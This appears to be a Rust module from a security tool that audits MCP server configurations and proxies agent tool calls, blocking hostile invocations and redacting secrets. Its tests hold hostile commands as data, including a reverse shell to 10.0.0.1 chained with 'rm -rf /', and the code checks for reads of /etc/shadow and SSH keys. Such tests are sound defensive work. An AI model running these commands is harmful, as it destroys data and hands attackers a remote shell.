use crate::sast::{self, RuleCategory, SastSeverity, VulnerabilityFinding};
use colored::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpConfigFile {
    #[serde(default, rename = "mcpServers")]
    pub mcp_servers: HashMap<String, McpServerEntry>,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct McpServerEntry {
    pub command: String,
    #[serde(default)]
    pub args: Vec<String>,
    #[serde(default)]
    pub env: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct McpAuditReport {
    pub total_servers: usize,
    pub findings: Vec<VulnerabilityFinding>,
    pub clean: bool,
}

/// Audit an MCP configuration file (.agents/mcp_config.json) for security vulnerabilities
pub fn audit_mcp_config(config_path: &Path) -> Result<McpAuditReport, Box<dyn std::error::Error>> {
    let raw = fs::read_to_string(config_path)?;
    let parsed: McpConfigFile = serde_json::from_str(&raw)?;
    let mut findings = Vec::new();

    for (server_name, entry) in &parsed.mcp_servers {
        // 1. Audit executable command vector
        let cmd_findings =
            sast::scan_content(&entry.command, Some(&format!("mcp:{}", server_name)));
        findings.extend(cmd_findings);

        // Check for shell wrapping antipatterns
        if entry.command == "bash" || entry.command == "sh" || entry.command == "cmd.exe" {
            findings.push(VulnerabilityFinding {
                rule_id: "NW-MCP-001".to_string(),
                title: "Shell-Wrapped MCP Server Invocations".to_string(),
                category: RuleCategory::SystemExecution,
                severity: SastSeverity::High,
                file_path: Some(format!("mcp:{}", server_name)),
                line_number: None,
                matched_snippet: format!("command: {}", entry.command),
                recommendation: "Invoke standalone binary directly without shell interpreter wrapper to prevent command expansion.".to_string(),
            });
        }

        // 2. Audit arguments for injections or traversals
        let joined_args = entry.args.join(" ");
        let arg_findings = sast::scan_content(&joined_args, Some(&format!("mcp:{}", server_name)));
        findings.extend(arg_findings);

        // 3. Audit environment variables for exposed secrets
        if let Some(ref env_map) = entry.env {
            for (key, val) in env_map {
                let env_content = format!("{}={}", key, val);
                let env_findings =
                    sast::scan_content(&env_content, Some(&format!("mcp:{}:env", server_name)));
                findings.extend(env_findings);
            }
        }
    }

    let clean = findings.is_empty();
    Ok(McpAuditReport {
        total_servers: parsed.mcp_servers.len(),
        findings,
        clean,
    })
}

/// Inspect a runtime JSON-RPC Model Context Protocol payload
pub fn inspect_mcp_json_rpc(payload: &str) -> Result<(), Box<VulnerabilityFinding>> {
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(payload) {
        let method = val["method"].as_str().unwrap_or("");

        if method == "tools/call" {
            let tool_name = val["params"]["name"].as_str().unwrap_or("unknown");
            let args_str = val["params"]["arguments"].to_string();

            // Run SAST scan on serialized tool call arguments
            let findings = sast::scan_content(&args_str, Some(tool_name));
            if let Some(critical) = findings
                .into_iter()
                .find(|f| f.severity == SastSeverity::Critical || f.severity == SastSeverity::High)
            {
                return Err(Box::new(critical));
            }
        } else if method == "resources/read" {
            let uri = val["params"]["uri"].as_str().unwrap_or("");
            if uri.contains("/etc/shadow") || uri.contains("/etc/passwd") || uri.contains("id_rsa")
            {
                return Err(Box::new(VulnerabilityFinding {
                    rule_id: "NW-MCP-002".to_string(),
                    title: "Sensitive Host Resource URI Access".to_string(),
                    category: RuleCategory::SystemExecution,
                    severity: SastSeverity::Critical,
                    file_path: Some("mcp:resources/read".to_string()),
                    line_number: None,
                    matched_snippet: uri.to_string(),
                    recommendation:
                        "Enforce workspace boundary sandbox; restrict host credential file reads."
                            .to_string(),
                }));
            }
        }
    }

    Ok(())
}

/// Transform incoming JSON-RPC line from client, intercepting and blocking hostile tool invocations
pub fn process_client_mcp_line(
    line: &str,
    sanitize: bool,
) -> Result<String, (serde_json::Value, Box<VulnerabilityFinding>)> {
    match inspect_mcp_json_rpc(line) {
        Ok(()) => {
            if sanitize {
                let (sanitized, _) = sast::sanitize_secrets(line);
                Ok(sanitized)
            } else {
                Ok(line.to_string())
            }
        }
        Err(finding) => {
            let req_id = serde_json::from_str::<serde_json::Value>(line)
                .ok()
                .and_then(|v| v.get("id").cloned())
                .unwrap_or(serde_json::Value::Null);

            let err_resp = serde_json::json!({
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {
                    "code": -32000,
                    "message": format!(
                        "Nether Ward Sentinel: Tool invocation blocked by perimeter firewall. Rule: {} [{}]",
                        finding.title, finding.rule_id
                    ),
                    "data": {
                        "rule_id": finding.rule_id,
                        "category": finding.category.to_string(),
                        "severity": finding.severity.to_string(),
                        "recommendation": finding.recommendation
                    }
                }
            });

            Err((err_resp, finding))
        }
    }
}

/// Transform outgoing JSON-RPC line from server to client, redacting secrets in-flight
pub fn process_server_mcp_line(line: &str, sanitize: bool) -> String {
    if sanitize {
        let (sanitized, _) = sast::sanitize_secrets(line);
        sanitized
    } else {
        line.to_string()
    }
}

/// Run bidirectional stdio proxy between coding agent and underlying MCP server
pub async fn run_mcp_proxy(
    cmd: &str,
    args: &[String],
    sanitize: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    eprintln!(
        "{} Initializing stdio proxy for target '{}' (Sanitization: {})",
        "NETHER WARD MCP PROXY:".cyan().bold(),
        cmd,
        if sanitize {
            "Active".green()
        } else {
            "Disabled".yellow()
        }
    );

    let mut child = Command::new(cmd)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()?;

    let mut child_stdin = child.stdin.take().expect("Child stdin unavailable");
    let child_stdout = child.stdout.take().expect("Child stdout unavailable");

    // Task 1: Stdin from parent process (agent) -> inspect / sanitize -> child stdin
    let stdin_task = tokio::spawn(async move {
        let stdin = tokio::io::stdin();
        let mut reader = BufReader::new(stdin).lines();

        while let Ok(Some(line)) = reader.next_line().await {
            let line_trimmed = line.trim();
            if line_trimmed.is_empty() {
                continue;
            }

            match process_client_mcp_line(line_trimmed, sanitize) {
                Ok(forward_line) => {
                    if let Err(e) = child_stdin
                        .write_all(format!("{forward_line}\n").as_bytes())
                        .await
                    {
                        eprintln!("Nether Ward MCP Proxy: Target stdin closed: {e}");
                        break;
                    }
                    let _ = child_stdin.flush().await;
                }
                Err((err_resp, finding)) => {
                    eprintln!(
                        "{} Blocked hostile MCP tool invocation: {} [{}]",
                        "NETHER WARD MCP PROXY:".red().bold(),
                        finding.title,
                        finding.rule_id
                    );
                    let mut stdout = tokio::io::stdout();
                    let _ = stdout.write_all(format!("{}\n", err_resp).as_bytes()).await;
                    let _ = stdout.flush().await;
                }
            }
        }
    });

    // Task 2: Child stdout -> sanitize secrets -> parent stdout
    let stdout_task = tokio::spawn(async move {
        let mut reader = BufReader::new(child_stdout).lines();
        let mut stdout = tokio::io::stdout();

        while let Ok(Some(line)) = reader.next_line().await {
            let out_line = process_server_mcp_line(&line, sanitize);
            if let Err(e) = stdout.write_all(format!("{out_line}\n").as_bytes()).await {
                eprintln!("Nether Ward MCP Proxy: Client stdout closed: {e}");
                break;
            }
            let _ = stdout.flush().await;
        }
    });

    let (res, _, _) = tokio::join!(child.wait(), stdin_task, stdout_task);
    if let Ok(status) = res {
        if let Some(code) = status.code() {
            if code != 0 {
                std::process::exit(code);
            }
        }
    }

    Ok(())
}

pub fn print_mcp_report(report: &McpAuditReport, path_str: &str) {
    println!(
        "\n{}",
        "================================================================================".blue()
    );
    println!(
        "{}",
        "          NETHER WARD: MODEL CONTEXT PROTOCOL (MCP) SECURITY AUDIT             "
            .bold()
            .cyan()
    );
    println!(
        "{}",
        "================================================================================".blue()
    );
    println!("{:<24}: {}", "Config Path".bold(), path_str);
    println!(
        "{:<24}: {}",
        "Configured Servers".bold(),
        report.total_servers
    );
    println!("{:<24}: {}", "Findings Count".bold(), report.findings.len());

    if report.clean {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            "CLEAN (Zero Vulnerabilities Detected)".green().bold()
        );
    } else {
        println!(
            "{:<24}: {}",
            "Audit Status".bold(),
            format!("VULNERABILITIES DETECTED ({})", report.findings.len())
                .red()
                .bold()
        );
        println!(
            "\n{:<12} {:<10} {:<30} {:<24}",
            "RULE ID".bold(),
            "SEVERITY".bold(),
            "TITLE".bold(),
            "TARGET".bold()
        );
        println!(
            "{}",
            "--------------------------------------------------------------------------------"
                .blue()
        );
        for f in &report.findings {
            let sev_colored = match f.severity {
                SastSeverity::Critical => f.severity.to_string().red().bold(),
                SastSeverity::High => f.severity.to_string().red(),
                SastSeverity::Medium => f.severity.to_string().yellow(),
                SastSeverity::Low | SastSeverity::Info => f.severity.to_string().cyan(),
            };
            println!(
                "{:<12} {:<10} {:<30} {:<24}",
                f.rule_id.bold(),
                sev_colored,
                f.title.chars().take(30).collect::<String>(),
                f.file_path.as_deref().unwrap_or("-")
            );
            println!("  Snippet: {}", f.matched_snippet.italic());
            println!("  Fix:     {}", f.recommendation);
            println!();
        }
    }
    println!(
        "{}",
        "================================================================================".blue()
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_inspect_clean_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "read_file", "arguments": {"Path": "/home/user/project/src/main.rs"}}}"#;
        assert!(inspect_mcp_json_rpc(payload).is_ok());
    }

    #[test]
    fn test_inspect_hostile_mcp_tool_call() {
        let payload = r#"{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "run_command", "arguments": {"CommandLine": "rm -rf / && /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1"}}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.category, RuleCategory::SystemExecution);
    }

    #[test]
    fn test_inspect_sensitive_mcp_resource() {
        let payload = r#"{"jsonrpc": "2.0", "id": 3, "method": "resources/read", "params": {"uri": "file:///etc/shadow"}}"#;
        let res = inspect_mcp_json_rpc(payload);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.rule_id, "NW-MCP-002");
    }

    #[test]
    fn test_audit_clean_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_clean_mcp.json");
        let content = r#"{
            "mcpServers": {
                "git": { "command": "mcp-server-git", "args": ["--repo", "/tmp/repo"] },
                "fetch": { "command": "mcp-server-fetch", "args": [] }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 2);
        assert!(report.clean);
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_audit_vulnerable_mcp_config() {
        let temp_path = std::env::temp_dir().join("test_vuln_mcp.json");
        let content = r#"{
            "mcpServers": {
                "insecure": {
                    "command": "bash",
                    "args": ["-c", "eval $(cat secret.txt)"],
                    "env": {
                        "AWS_SECRET": "AKIAIOSFODNN7EXAMPLE"
                    }
                }
            }
        }"#;
        fs::write(&temp_path, content).unwrap();
        let report = audit_mcp_config(&temp_path).unwrap();
        assert_eq!(report.total_servers, 1);
        assert!(!report.clean);
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-MCP-001"));
        assert!(report.findings.iter().any(|f| f.rule_id == "NW-SEC-001"));
        let _ = fs::remove_file(temp_path);
    }

    #[test]
    fn test_process_client_mcp_line_clean_forwarding() {
        let line = r#"{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"read_file","arguments":{"Path":"/home/user/file.txt"}}}"#;
        let res = process_client_mcp_line(line, false);
        assert!(res.is_ok());
        assert_eq!(res.unwrap(), line);
    }

    #[test]
    fn test_process_client_mcp_line_blocked_error_injection() {
        let line = r#"{"jsonrpc":"2.0","id":99,"method":"tools/call","params":{"name":"run_command","arguments":{"CommandLine":"rm -rf /"}}}"#;
        let res = process_client_mcp_line(line, false);
        assert!(res.is_err());
        let (err_json, finding) = res.unwrap_err();
        assert_eq!(err_json["jsonrpc"], "2.0");
        assert_eq!(err_json["id"], 99);
        assert_eq!(err_json["error"]["code"], -32000);
        assert!(err_json["error"]["message"]
            .as_str()
            .unwrap()
            .contains("Nether Ward Sentinel"));
        assert_eq!(finding.category, RuleCategory::SystemExecution);
    }

    #[test]
    fn test_process_server_mcp_line_secret_redaction() {
        let line = r#"{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"AWS_KEY=AKIAIOSFODNN7EXAMPLE"}]}}"#;
        let sanitized = process_server_mcp_line(line, true);
        assert!(!sanitized.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(sanitized.contains("AKIA***REDACTED***MPLE"));
    }
}
